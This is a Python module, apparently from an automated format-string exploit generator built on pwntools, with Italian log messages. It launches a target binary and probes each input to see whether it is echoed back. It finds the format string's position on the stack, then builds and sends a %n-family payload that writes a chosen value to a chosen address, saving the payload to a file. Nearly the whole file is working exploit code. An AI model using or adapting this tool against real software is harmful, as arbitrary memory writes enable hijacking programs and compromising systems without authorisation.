import FormatStringGenerator
import Logger
import exceptions
from pwn import *


def format_pack(write_dimension, order_byte):
    if write_dimension == 8:
        architecture_char = "Q"
    elif write_dimension == 4:
        architecture_char = "L"
    elif write_dimension == 2:
        architecture_char = "H"
    elif write_dimension == 1:
        architecture_char = "B"

    if order_byte == "little":
        byte_char = "<"
    elif order_byte == "big":
        byte_char = ">"
    else:
        byte_char = ""

    return byte_char + architecture_char


def get_write_size(write_dimension, value, order_byte):
    byte_sizes = [8, 4, 2, 1]
    current_byte_sizes = [write_dimension]

    while True:
        j = 0
        bytes_list = []
        for byte_size in current_byte_sizes:
            bytes_list.append(value[j:j + byte_size])
            j += byte_size

        total_padding = 0

        values_list = []
        for hex_bytes in bytes_list:
            new_value = int.from_bytes(hex_bytes, byteorder=order_byte)
            values_list.append(new_value)
            total_padding += new_value

        if total_padding < 4000:
            print(*current_byte_sizes, sep=';')
            return current_byte_sizes, bytes_list
        else:
            max_index = values_list.index(max(values_list))
            current_byte_size = current_byte_sizes[max_index]

            byte_size_index = byte_sizes.index(current_byte_size)
            new_byte_size = byte_sizes[byte_size_index + 1]
            current_byte_sizes[max_index] = new_byte_size
            current_byte_sizes.insert(max_index, new_byte_size)


def define_markers(response):
    markers_count = [0, 0, 0]
    for i in range(2, 50):
        for j in range(200):
            test_markers = [''.join(random.choice("ghijklmnopqrstuvwxyz") for h in range(i)),
                            ''.join(random.choice("ghijklmnopqrstuvwxyz") for h in range(i))]

            print(test_markers)
            if markers_count[0] == response.count(test_markers[0]) and markers_count[1] == response.count(
                    test_markers[1]):
                if markers_count[2] + 1 == 10:
                    return test_markers
                markers_count[2] += 1
            else:
                markers_count[0] = response.count(test_markers[0])
                markers_count[1] = response.count(test_markers[1])
            j += 1
        i += 1

    raise exceptions.MarkersNotDefinedError


def get_wrapped_string(response, markers):
    print("get wrapped")
    print(response)
    try:
        found = re.search(markers[0] + '(.+?)' + markers[1], response)[1]
        print("found = " + str(found))
        return found
    except:
        print("Errore nell'estrazione della risposta")
        raise exceptions.MarkersNotFoundError


def get_addresses(response, markers):
    try:
        found = get_wrapped_string(response, markers)
        return (found.replace("(nil)", "0x0").replace("G", "")).split("0x")[1:]
    except exceptions.MarkersNotFoundError as e:
        raise


class Exploit:
    def __init__(self, target, value, target_address, input_in_json, configs):
        self.start_fmt_position = None

        self.target = target
        self.target_address = target_address
        self.configs = configs

        e = ELF(target)
        self.order_byte = e.endian
        self.address_size = e.bytes
        self.write_dimension = self.configs["bytes_to_write"] if self.configs["bytes_to_write"] in [1, 2, 4, 8] and \
                                                                 self.configs[
                                                                     "bytes_to_write"] <= self.address_size else self.address_size
        print(self.write_dimension)
        self.command_line_input_list = list()
        self.during_execution_input_list = list()
        for input_elem in input_in_json["input"]:
            if input_elem["value"] == "":
                input_elem["value"] = "P" * self.address_size
                input_elem["free"] = True
            else:
                input_elem["free"] = False

            if input_elem["type"] == "execution_input":
                self.during_execution_input_list.append(input_elem)
            elif input_elem["type"] == "command_line_input":
                self.command_line_input_list.append(input_elem)
        print(self.during_execution_input_list)

        self.value = struct.pack(format_pack(self.address_size, self.order_byte), value)

        self.direct_fmt_generator = FormatStringGenerator.DirectFmtGenerator()

        self.logger = Logger.Logger(self.target, self.configs)
        self.logger.write(
            "Dimensione indirizzi: {} byte\nEndian: {}\n\nInput da linea di comando: {}\nInput da passare durante l'esecuzione: {}".format(
                self.address_size, self.order_byte, self.command_line_input_list, self.during_execution_input_list))

        fmt_length_without_writer_position = self.prepare_writer()
        self.test_free_input(fmt_length_without_writer_position)

    def send_payload(self, encoded=False):
        command_line_inputs = list()
        for elem in self.command_line_input_list:
            command_line_inputs.append(elem["value"])
        p = process([self.target] + command_line_inputs)
        print("Command line inputs " + str(self.command_line_input_list))

        total_response = ""
        try:
            if len(self.during_execution_input_list) > 0:
                if self.configs["wait_time"] == -1:
                    total_response += p.recvuntil(delims=self.during_execution_input_list[0]["marker"]).decode("latin1")
                else:
                    total_response += p.recvuntil(delims=self.during_execution_input_list[0]["marker"],
                                                  timeout=self.configs["wait_time"]).decode("latin1")

                for i in range(0, len(self.during_execution_input_list)):
                    elem = self.during_execution_input_list[i]
                    p.sendline(str.encode(elem["value"])) if encoded is False else p.sendline(elem["value"])
                    if i < len(self.during_execution_input_list) - 1:

                        if self.configs["wait_time"] == -1:
                            response = p.recvuntil(self.during_execution_input_list[i + 1]["marker"]).decode("latin1")
                        else:
                            response = p.recvuntil(self.during_execution_input_list[i + 1]["marker"],
                                                   timeout=self.configs["wait_time"]).decode("latin1")

                    else:
                        response = p.recvall().decode("latin1")

                    total_response += response

            else:
                total_response = p.recvall(timeout=self.configs["wait_time"]).decode("latin1") if self.configs[
                                                                                                      "wait_time"] != -1 else p.recvall(
                    timeout=self.configs["wait_time"]).decode("latin1")
                print(total_response)
        except EOFError as e:
            print(total_response)
            print("EOF")
            raise

        if p.poll() == -11:
            raise exceptions.SegfaultError

        return total_response

    def prepare_writer(self):
        write_size, value_padding = get_write_size(self.address_size, self.value, self.order_byte)
        print("WRITE_SIZE: ")
        print(write_size)

        target_addresses = list()
        values = list()
        addr = self.target_address
        for i in write_size:
            target_addresses.append(struct.pack(format_pack(self.address_size, self.order_byte), addr))
            addr = addr + i
            print("Target address " + hex(addr))

        for bytes in value_padding:
            # values.append(bytes)
            values.append(int.from_bytes(bytes, byteorder=self.order_byte))

        target_addresses = [address for _, address, _ in sorted(zip(values, target_addresses, write_size))]
        write_size = [w_size for _, _, w_size in sorted(zip(values, target_addresses, write_size))]
        values.sort()

        counter = 0
        writers_len = 0
        for value, address, w_size in zip(values, target_addresses, write_size):
            print(str(value) + ', ' + address.decode("latin1"))

            if w_size == 8:
                writer = "ln"
            elif w_size == 4:
                writer = "n"
            elif w_size == 2:
                writer = "hn"
            elif w_size == 1:
                writer = "hhn"

            print('counter ' + str(counter))
            # print(str(len(self.string_generator.)))
            print('value is ' + str(value))

            padding = value - counter
            counter += padding

            if padding < 8:
                padding = "A" * padding
            else:
                padding = "%" + str(padding) + "x"

            print("writer:")
            print(writer)
            self.direct_fmt_generator.add_writer([padding, writer])
            writers_len += len(padding) + len(writer)

        self.direct_fmt_generator.set_address(target_addresses)

        print("writer_len " + str(writers_len))
        print("addr_len " + str(len(target_addresses) * self.address_size))

        return writers_len + len(target_addresses) * self.address_size

    def test_free_input(self, fmt_length_without_writer):
        pattern = ''.join(random.choice(string.ascii_uppercase) for i in range(fmt_length_without_writer))
        confirm_pattern = ''.join(random.choice(string.ascii_lowercase) for i in range(fmt_length_without_writer))

        self.logger.write("\n\n\nInizio ricerca di input vulnerabili\n\n")

        for input_elem in (self.command_line_input_list + self.during_execution_input_list):
            self.direct_fmt_generator.reset_direct_parameter_num()
            self.logger.write("Input in test: {}\n".format(input_elem))

            if input_elem["free"] is False:
                self.logger.write("Input non libero\n\n")
                continue

            try:
                input_elem["value"] = pattern
                self.logger.write("Input libero, verifica se stampa la dimensione minina della fmt: ")

                response = self.send_payload()

                print(response)
                pattern_occ = response.count(pattern)
                confirm_pattern_occ = response.count(confirm_pattern)

                input_elem["value"] = confirm_pattern

                response = self.send_payload()

                if not (response.count(pattern) == pattern_occ - 1 and response.count(
                        confirm_pattern) == confirm_pattern_occ + 1):
                    raise exceptions.InputTooLittleError

                self.logger.write("dimensione minima stampata\nDefinizione marcati per estrarre fmt nella risposta: ")

                markers = define_markers(response)

                self.logger.write("{}, {}\n".format(markers[0], markers[1]))

                # Provo a capire quanti caratteri posso passare all'input (valore specifico o > 500)
                self.logger.write("Conteggio della dimansione effettiva dell'input (fino a {} caratteri): ".format(
                    500 + fmt_length_without_writer + len(markers[0] + markers[1])))
                input_elem["value"] = markers[0]
                response = self.send_payload()

                if response.count(markers[0]) != 1:
                    self.logger.write("possibili stampe multiple dell'input rilevate")
                    input_elem["free"] = False
                    input_elem["value"] = "PPPP"
                    continue

                print(markers)
                print(response)
                input_elem["value"] = markers[0] * (500 + fmt_length_without_writer)
                response = self.send_payload()

                input_len = (len((max(re.findall('((' + markers[0] + ')+' + ')', response), key=lambda tpl: len(tpl[0]))[
                    0]))) - len(markers[0] + markers[1])
                print(input_len)

                self.logger.write("{} caratteri disponibili\n".format(input_len))

                self.logger.write("Ricerca fmt su stack: ")
                shift_for_broken_pattern = self.find_fmt_position_on_stack(input_elem, input_len, markers)

                self.logger.write("posizione {}\n".format(self.start_fmt_position))
                self.logger.write("Generazione fmt per exploit: ")
                if input_elem["type"] == "execution_input":
                    exploit = self.define_direct_fmt(input_elem, input_len, markers)

                    self.logger.write("generazione completata con successo\n")
                    input_elem["value"] = exploit
                    response = self.send_payload(True)

                    self.logger.write(
                        "La risposta è:\n----------------------------------------\n{}\n----------------------------------------\n".format(
                            response))
                    return
                else:
                    i = 0
                    for writer in self.direct_fmt_generator.writers:
                        pos = "0" * (4 - len(str(self.start_fmt_position + i))) + str(self.start_fmt_position + i)
                        pos = "%" + pos + "$"
                        writer[1] = pos + writer[1]
                        i += 1

                    exploit = self.direct_fmt_generator.generate_final_fmt2(shift_for_broken_pattern, len(markers[0]),
                                                                            input_len) + markers[1].encode()

                    self.logger.write("generazione completata con successo\n")

                    input_elem["value"] = exploit
                    response = self.send_payload(True)

                    self.logger.write(
                        "La risposta è:\n----------------------------------------\n{}\n----------------------------------------\n".format(
                            response))
                    return

            except (exceptions.SegfaultError, exceptions.MarkersNotFoundError, EOFError, exceptions.InputTooLittleError, exceptions.MarkersNotDefinedError) as e:
                if type(e) is exceptions.SegfaultError:
                    self.logger.write("impossibile testare input, incontrato segmentation fault\n\n")
                if type(e) is EOFError:
                    self.logger.write("impossibile testare input, incontrato EOF non previsto\n\n")
                if type(e) is exceptions.InputTooLittleError:
                    self.logger.write("dimensione non sufficiente a stampare l'fmt\n\n")
                if type(e) is exceptions.MarkersNotDefinedError:
                    self.logger.write("impossibile definire marcatori\n\n")
                if type(e) is exceptions.MarkersNotFoundError:
                    self.logger.write("marcatori non individuati nella risposta\n\n")

                input_elem["free"] = False
                input_elem["value"] = "PPPP"
                continue

        self.logger.write("Nessun input exploitabile individuato")

    def find_fmt_position_on_stack(self, input_in_testing, input_len, markers):
        print("FORMAT STRING POSITION:")

        try:
            checked_addresses = 0
            segfault_count = 0
            markers_not_found_count = 0
            while True:
                pattern = "AAAAAAAA" if self.address_size == 8 else "AAAA"
                self.direct_fmt_generator.set_temp_address(pattern)

                found = False
                position = None
                shift_for_broken_pattern = 0
                while not found:
                    if input_in_testing["type"] == "execution_input":
                        fmt = self.direct_fmt_generator.generate_next_fmt_for_find_start(
                            input_len) if segfault_count == 0 else self.direct_fmt_generator.generate_next_fmt_for_find_start_segfault_encountered(
                            input_len)

                        input_in_testing["value"] = markers[0] + fmt + markers[1]
                    else:
                        fmt = self.direct_fmt_generator.generate_next_fmt_for_command_line_input(input_len)

                        print(str(fmt))
                        input_in_testing["value"] = markers[0] + fmt + markers[1]

                    try:
                        response = self.send_payload()
                    except exceptions.SegfaultError as e:
                        if segfault_count == 0:
                            segfault_count += 1
                            self.direct_fmt_generator.set_direct_parameter_num(checked_addresses)
                            continue
                        else:
                            raise
                    print("........................................")
                    print(response)

                    try:
                        addresses = get_addresses(response, markers)
                    except exceptions.MarkersNotFoundError as e:
                        self.direct_fmt_generator.set_direct_parameter_num(checked_addresses)
                        continue

                    hex_pattern = pattern.encode().hex()
                    print(fmt)
                    for i in range(len(addresses)):
                        print("INDIRIZZO " + str(i) + " -> " + str(addresses[i]))
                        if addresses[i] == hex_pattern:
                            position = i
                            # positio + 1 + checked = 12 -> pos att -> controllo dalla 13 -> setto 14
                            self.direct_fmt_generator.set_direct_parameter_num(
                                (position + 1 + checked_addresses) + 2)  # salto la posizione corrente position+1
                            break
                        elif i < len(addresses) - 1:
                            if addresses[i].count("00") == 0 and addresses[i + 1].count("00") == 0 and \
                                    addresses[i].count(hex_pattern[0:2]) + addresses[i + 1].count(
                                hex_pattern[0:2]) == self.address_size:
                                position = i
                                shift_for_broken_pattern = addresses[i].count(hex_pattern[0:2])
                                self.direct_fmt_generator.set_direct_parameter_num((position + 1 + checked_addresses) + 2)
                                break
                            elif addresses[i].count("00") > 0 or addresses[i + 1].count("00") > 0:
                                count_curr_addr = (addresses[i].split("00"))[0].count(hex_pattern[0:2])
                                count_next_addr = (addresses[i + 1].split("00"))[1].count(hex_pattern[0:2]) if \
                                    addresses[i + 1].count("00") > 0 else addresses[i + 1].count(hex_pattern[0:2])
                                if count_curr_addr + count_next_addr == self.address_size:
                                    position = i
                                    shift_for_broken_pattern = count_curr_addr
                                    self.direct_fmt_generator.set_direct_parameter_num(
                                        (position + 1 + checked_addresses) + 2)
                                    break

                    print("Position: " + str(position))

                    if position is not None:
                        found = True
                    else:
                        print(len(addresses))
                        checked_addresses += len(addresses) - 1
                        print("cheched addresses " + str(checked_addresses))

                print("Cerco b")
                confirm_pattern = "BBBBBBBB" if self.address_size == 8 else "BBBB"
                hex_confirm_pattern = confirm_pattern.encode().hex()

                input_in_testing["value"] = input_in_testing["value"].replace("A", "B")

                response = self.send_payload()
                print(response)

                addresses = get_addresses(response, markers)

                print("Address " + str(position) + " = " + str(addresses[position]))
                print("Address " + str(position + 1) + " = " + str(addresses[position + 1]))

                print("QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ")
                if addresses[position] == hex_confirm_pattern:
                    self.start_fmt_position = position + 1 + checked_addresses
                    print("Posizione iniziale " + str(self.start_fmt_position + 1))

                    return
                elif addresses[position].count("00") == 0 and addresses[position + 1].count("00") == 0 and \
                        addresses[position].count(hex_confirm_pattern[0:2]) + addresses[position + 1].count(
                    hex_confirm_pattern[0:2]) == self.address_size:
                    self.start_fmt_position = (position + 2) + checked_addresses

                    return shift_for_broken_pattern
                elif addresses[position].count("00") > 0 or addresses[position + 1].count("00") > 0:
                    count_curr_addr = (addresses[position].split("00"))[0].count(hex_confirm_pattern[0:2])
                    count_next_addr = (addresses[position + 1].split("00"))[1].count(hex_confirm_pattern[0:2]) if \
                        addresses[position + 1].count("00") > 0 else addresses[position + 1].count(hex_confirm_pattern[0:2])

                    if count_curr_addr + count_next_addr == self.address_size:
                        self.start_fmt_position = (position + 2) + checked_addresses

                        return shift_for_broken_pattern

                checked_addresses += position + 1
                print(".................................. + " + str(checked_addresses))

        except (exceptions.InputTooLittleError, exceptions.MarkersNotFoundError) as e:
            raise

    def define_direct_fmt(self, input_in_testing, input_len, markers):
        writers = getattr(self.direct_fmt_generator, "writers")

        current_offset = 0
        for writer in writers:
            current_offset += len(str(writer[0]) + str(writer[1]))

        print("Current_offset " + str(current_offset))

        self.start_fmt_position -= (
                (len(markers[0]) // self.address_size) + (1 if len(markers[0]) % self.address_size != 0 else 0))
        print(self.start_fmt_position)
        # %0pos$
        total_offset = current_offset + (1 + (1 + len(str(self.start_fmt_position))) + 1) * len(writers)
        address_position_incr = total_offset // self.address_size
        not_covered_offset = total_offset % self.address_size

        print("total_offset " + str(total_offset))

        if not_covered_offset > 0:
            address_position_incr += 1
            self.direct_fmt_generator.set_align_padding("B" * (self.address_size - not_covered_offset))

        i = 0
        for writer in writers:
            pos = "0" + str(address_position_incr + self.start_fmt_position + i) if len(
                str(address_position_incr + self.start_fmt_position)) == len(str(self.start_fmt_position)) else str(
                address_position_incr + self.start_fmt_position + i)
            pos = "%" + pos + "$"
            writer[1] = pos + writer[1]
            i += 1

        try:
            self.direct_fmt_generator.set_temp_address(("C" * self.address_size))
            if len(self.direct_fmt_generator.generate_fmt_for_find_end()) > input_len:
                input_in_testing["value"] = markers[0] + "C" * (
                            len(self.direct_fmt_generator.generate_fmt_for_find_end()) - len(markers[0] + markers[1])) + \
                                            markers[1]
                response = self.send_payload()
                print(input_in_testing["value"])
                print(response)
                if len(get_wrapped_string(response, markers)[0]) != len(self.direct_fmt_generator.generate_fmt_for_find_end()):
                    return -1
        except exceptions.MarkersNotFoundError as e:
            raise

        f = open('exp', 'wb')
        f.write(self.direct_fmt_generator.generate_fmt_in_byte())
        f.close()

        response = self.send_payload(encoded=True)

        print(response)

        print(address_position_incr + self.start_fmt_position)

        print(self.direct_fmt_generator.generate_fmt_for_find_end())

        self.direct_fmt_generator.set_temp_address("A" * 8)
        input_in_testing["value"] = self.direct_fmt_generator.generate_fmt_for_find_end()
        print(self.send_payload())

        return self.direct_fmt_generator.generate_fmt_in_byte()
